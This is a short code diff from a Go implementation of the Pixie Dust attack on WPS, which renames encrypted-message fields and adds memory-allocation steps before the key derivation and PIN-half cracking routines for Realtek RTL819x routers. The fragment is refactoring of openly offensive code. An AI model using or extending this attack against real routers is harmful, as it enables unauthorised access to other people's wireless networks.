@@ -31,8 +31,15 @@ import (
 
 
 func (pda *pixieDustAttack) executeRTL819xCase() {
-	if len(pda.m7enc) == 0 { return }
+	if len(pda.m7encr) == 0 { return }
 	pda.rtl819xReqFlags()
+
+	pda.memAllocDHKey()
+	pda.memAllocKDK()
+	pda.memAllocAuthKey()
+	pda.memAllocWrapKey()
+	pda.memAllocEMSK()
+	
 	pda.computeDHKey()
 	pda.setKDK()
 	pda.kdf()
@@ -40,6 +47,12 @@ func (pda *pixieDustAttack) executeRTL819xCase() {
 	pda.decryptM5()
 
 	if pda.hasAllRTLdata() {
+		pda.memAllocESecret1()
+		pda.memAllocESecret2()
+		pda.memAllocPSK1()
+		pda.memAllocPSK2()
+		pda.memAllocEmptyPSK()
+		
 		pda.emptyPinHMAC()
 		pda.findESecrets()
 		pda.crackFirstHalf(nil)
@@ -142,15 +155,15 @@ func (pda *pixieDustAttack) decryptEncryptedSettings(encr []byte) []byte {
 
 
 func (pda *pixieDustAttack) decryptM5() {
-	pda.decrypted5 = pda.decryptEncryptedSettings(pda.m5enc)
-	pda.m5enc      = nil
+	pda.decrypted5 = pda.decryptEncryptedSettings(pda.m5encr)
+	pda.m5encr     = nil
 }
 
 
 
 func (pda *pixieDustAttack) decryptM7() {
-	pda.decrypted7 = pda.decryptEncryptedSettings(pda.m7enc)
-	pda.m7enc      = nil
+	pda.decrypted7 = pda.decryptEncryptedSettings(pda.m7encr)
+	pda.m7encr     = nil
 }
 
 
